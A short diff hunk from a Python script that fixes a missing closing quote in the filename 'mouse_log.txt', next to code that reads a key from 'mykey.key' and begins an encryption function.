@@ -83,7 +83,7 @@ if not os.path.exists('mykey.key'):
 with open('mykey.key', 'rb') as mykey:
     key = mykey.read()
 
-the_file = 'mouse_log.txt
+the_file = 'mouse_log.txt'
 #Encrypting
 def Encrypt():
 
